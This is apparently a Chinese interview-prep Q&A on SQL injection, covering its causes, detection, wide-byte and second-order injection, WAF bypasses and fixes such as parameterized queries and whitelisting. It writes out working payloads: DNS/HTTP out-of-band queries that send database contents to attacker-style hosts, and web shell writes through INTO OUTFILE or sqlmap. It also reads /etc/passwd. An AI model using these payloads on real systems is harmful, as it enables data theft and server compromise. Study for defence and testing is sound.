---
title: "面经 · SQL 注入 · 问答"
series_order: 2
date: 2026-04-13 12:00:00 +0800
categories:
  - SQL注入
---

## 正文

### Sql

\[图片]
\*堆叠注入用；将sql语句相间隔，内联注入则是在同一条sql通过嵌套或拼接的方式查询，联合查询从范围上属于内联查询。
内联注入、宽字节注入图中未标出。
注入类型有 6 种，可以参考 SQLMAP，报错、盲注、联合、时间、内联、堆叠。

#### 1. SQL 注入漏洞的成因是什么？（用户输入如何进入 SQL）

成因：程序把用户输入（如 `$SQL`）直接拼接到 SQL 字符串里参与执行，且未使用预编译/参数化或未做严格过滤与转义，导致用户输入被当作 SQL 的一部分执行。提交恶意构造的数据时，数据库会按“语句+注入内容”解析，从而报错、回显异常或执行攻击者意图。
select \* from news where id = '$SQL';

#### 2. 如何判断是否存在 SQL 注入？有哪些常用思路？

先试探参数是否参与数据库查询、是否存在注入（报错），在试探过程中自然区分出数字型/字符型/查询（like %'、'% ），再尝试通过报错/version函数测试出版本/数据库类型。最后按类型做闭合与后续利用。

#### 3. 除拖库读数据外，SQL 注入还有哪些利用方向？

利用方式：具体看什么数据库类型，像 SQLSERVER 可以命令执行，MYSQL 写 shell 有些权限大也可以执行命令但是条件是在 lINUX 环境下。
- 敏感文件读取、上传文件等
- 数据库提权，例如 MySQL 的 MOF 提权，得有写文件权限等条件

#### 4. 为什么有时没有错误回显？（盲注、带外等场景）

因为服务器/应用没有把报错信息输出给用户：例如关闭了错误显示（如 PHP 的 display\_errors=Off）、使用了错误抑制（如 @）、异常被 try-catch 捕获后未输出、或前端不展示后端返回的报错等，所以没有错误回显。

#### 5. SQL 漏洞的常见修复思路有哪些？`ORDER BY` 等结构位无法参数化时怎么办？

防范: 参数化查询，waf ， 数据库最小权限， 输入参数类型校验，整数的不允许传英文，白名单。
使用参数化查询如："SELECT \* FROM users WHERE id = ?1 AND id =?2
结构位无法参数化，使用白名单处置。占位符order by后只能写列名，是结构语句。
@Override
public List\<Map\<String, Object>> listUsersSafe(String sortField, String sortOrder) {
String column = "id";
if (sortField != null) {
switch (sortField.trim()) {
case "1":
column = "id";
break;
case "2":
column = "username";
break;
default:
column = "id";
}
}

```
    String direction = "asc";
    if (sortOrder != null && "desc".equalsIgnoreCase(sortOrder.trim())) {
        direction = "desc";
    }

    String sql = "SELECT id, username, email, role FROM users WHERE role = 'user' ORDER BY " + column + " " + direction + " LIMIT 3";
    Query query = entityManager.createNativeQuery(sql);
```

#### 6. 联合查询（UNION）注入的前提是什么？

UNION 注入要求：① 页面有数据回显；② UNION 前后查询列数相同；③ 对应位置数据类型兼容。无回显场景须改用盲注技术。

#### 7. 联合查询的一般流程是什么？

STEP 1 · 判断注入点类型—>STEP 2 · 确定列数（ORDER BY / UNION NULL）—>STEP 3 · 确定回显位置—>STEP 4 · 信息收集 → 拖库

#### 8. 报错注入常涉及哪些函数？（合集处原为飞书占位，答题时按 MySQL/MSSQL 等自行补全）



#### 9. 时间盲注里常用的延迟函数有哪些？（按数据库类型作答）



#### 10. 带外（OOB）注入发送的大致是什么数据？DNS / HTTP 带外各举思路（MySQL 常配合 DNS 带外）

- **MySQL（DNS 带外）**：
  ' union select load\_file (concat('\\\\',(select database()),'.xxxx.dnslog.xxx')),2,3#
- **MSSQL（DNS 带外）**：
  '; EXEC master..xp\_dirtree'\\' + (SELECTTOP1 nameFROM sys.databases)  +'.attacker.dnslog.cn\a' --
- **Oracle 等（HTTP 带外）**：`UTL_HTTP.request` 可让数据库作为客户端发起 HTTP 请求；把查询结果拼进 URL，在 HTTP 日志中可见。示例：
  '||UTL\_HTTP.request('<http://attacker.com/?d='||> (SELECTuserFROM dual  )) --

#### 11. DNSlog 注入常用到哪些函数？（以 MySQL 常用函数为主）

常用：`load_file()`、`database()`、`concat()`、`ascii()` 等，把查询结果拼进 DNS 名或配合带外查询。

#### 12. 堆叠注入在请求里有什么特征？

; SELECT 1;--
%3B SELECT 1--
也就是分号+sql语句以及变体。

#### 13. SQL 注释符有哪些？如何利用注释做截断或绕过？

\--、#、/… /
截断SE//LECT

#### 14. 二次注入通常如何触发？（结合改密码等场景）

场景：创建用户admin'#->转义为admin'#—>转义成功后进入数据库被还原—>到修改密码处—>admin的密码被篡改->注入成功
改密码，# 修改密码的sql逻辑
update users set password='$new\_pass' where username='$user' and password='$old\_pass';

# 如果是admin'# ,#符号之后的语句将会被忽略

update users set password='$new\_pass' where username='admin'# and password='$old\_pass';

#### 15. 二次注入如何修复？

写入、读取都用参数化 → 展示到页面时再做 HTML 转义。

#### 16. 实战中空格被过滤时，有哪些替代与思路？

- 将空格 URL 编码，例如 `%20`、`%0a` 等

- union select → 用 union all select 或 union distinct select
- from → 用 from 的内联注释 fr/*!*/om
- ascii() 被拦：用 ord()
- 主要思路就是对应函数的替代，前提最好是知道数据库版本和类型，这样找到的payload字典更匹配。

#### 17. `SELECT`、`UNION` 等关键字被过滤时可尝试哪些绕过？

双写、大小写、注释符绕过等。

#### 18. 什么是宽字节？（相对窄字节）

用于引号被过滤的情况。

窄字节：像英文字母、数字，用1 个字节就能存，最常见的就是 ASCII 编码；
宽字节：像汉字这种复杂字符，得用2 个及以上字节才能存，叫宽字节，常见的就是 GBK、GB2312 编码。

#### 19. 宽字节注入的原理是什么？

在GBK编码的环境下，两个单字节编码的字符可能会被合并转换成一个GBK编码的字符。
在 mysql 中使用了 gbk 编码，占用 2 个字节, 而 mysql 的一种特性, GBK 是多字节编码，它认为两个字节就代表一个汉字，所以 %df 时候会和转义符 \ %5c 进行结合, 所以单引号就逃逸了出来, 当第一个字节的 ascii 码大于 128，就可以成功注入。
eg：sqllibs33关
若直接输入select \* from table where id ='1' and 1=1 --+'
会被转译成select \* from table where id ='1/' and 1=1 --+'
第一个单引号失效，闭合失败
payload：select \* from table where id ='1%df' and 1=1 --+'

- 原始输入 `1%DF'`：字节序 `0x31 0xDF 0x27`
- 中间层转义 `'` → `\'`：在 `0x27` 前插入 `0x5C`，变成 `0x31 0xDF 0x5C 0x27`
- 数据库按 GBK 解码：
  - `0xDF 0x5C` 被识别为一个合法的双字节汉字（显示成生僻字，如“峟”），不再是“`0xDF` + 独立的反斜杠”。
  - 剩下的 `0x27` 是一个普通的单引号。
- 于是文本等价变为：`'1峟'` 后跟一个单引号；反斜杠不再作为转义符，后面的 `'` 可作为字符串闭合符。

#### 20. 宽字节问题的修复思路有哪些？

- 禁用 GBK/Big5，统一使用 utf8mb4，并确保连接/库/表/列/会话字符集一致。
  如果必须使用宽字节：
- 永远使用参数化查询，不做字符串拼接。
- 不依赖 addslashes/magic\_quotes 等转义机制作为安全防护。
- 对排序字段等结构化片段用白名单映射，不做参数化但避免拼接任意用户输入。

#### 21. `sqlmap` 大致工作流程是什么？如何用特殊字符/函数辅助判断数据库类型？

- sqlmap 由 Python 编写，大致流程：数据库类型猜测、注入类型猜测、数据库版本猜测、字段长度猜测、结论输出等。
- 数据库类型猜测：特殊字符，例如单引号、双引号、连接符等。
- 注入类型猜测：函数，例如 char、union、concat、select 等。
- 长度猜测：常用 `ORDER BY`。
- 运行机制概要：
  - 获取 URL、thread、headers 等信息存变量
  - 网站存活性检测
  - WAF 检测与类型识别
  - 稳定性检测
  - 注入检测

- 文件读写相关命令

* 使用 INTO OUTFILE() 写入 Web Shell:
  SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/var/www/html/shell.php';
* 使用 INTO DUMPFILE() 写入 Web Shell:
  SELECT '<?php echo shell_exec($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/shell.php';
* 使用 sqlmap 写入 Web Shell:
  sqlmap -u "<http://target.com/vuln.php?id=1>" --file-write=/path/to/shell.php --file-dest=/var/www/html/shell.php
* 使用 LOAD\_FILE() 读取文件:
  SELECT LOAD\_FILE('/etc/passwd');
* MSSQL 文件操作函数:
  - 检查文件是否存在：
    EXEC master..xp\_fileexist 'C:\path\to\file.txt';
  - 获取指定目录的文件夹列表：
    EXEC master..xp\_dirtree 'C:';
  - 获取指定目录内部的子目录列表：
    EXEC master..xp\_subdirs 'C:';

#### 22. SQL 注入里常用哪些语句/特征区分 MSSQL、Access、MySQL？（可按 MSSQL → Access → MySQL 各举一例）

**SQL 注入一开始用来判断数据库类型的语句是什么？**

- **MSSQL**：`;and (select count(*) from sysobjects)>0`
- **Access**：`;and (select count(*) from msysobjects)>0`
- **MySQL**：`select @@version`（亦可配合 `version()`、`@@datadir` 等）

#### 23. `sqlmap` 写 WebShell 一般需要满足哪些条件？`secure_file_priv` 等配置要点？（以 MySQL 写文件场景为主）

**sqlmap 中写入 shell 需要的条件是什么？**

- 数据库用户具备写权限（如 `FILE` 等）
- 用户对写入路径可写，且目标路径在允许范围内
- 能确定或猜中 Web 根路径等写入落点
- `secure_file_priv` 为空或包含目标路径（拼写注意为 `secure_file_priv`；原文「scure\_file\_prive」为笔误）

#### 24. 遇到 WAF 时，SQL 注入的绕过思路是什么？（可结合厂商差异简述）

如果发现sql注入点有waf，绕过思路是什么？

首先需要判断waf的类型，是什么厂商的，如果是长亭的雷池，除了正则匹配，它的特点是基于语义进行分析，主流的方法是multipart/form-data的特定构造（双写描述行）waf和sql解析位置不一致。
其他waf可以尝试大包绕过溢出之后输入payload、
分段绕过，参数污染（id=1,id=2)

#### 25. jdbc中的sql注入，除了预编译和类型验证，还有什么关键的安全防护？

jdbc参数：useServerPrepStmts:true开启时真正使用了服务端的预编译，SQL的逻辑和数据分两个包发
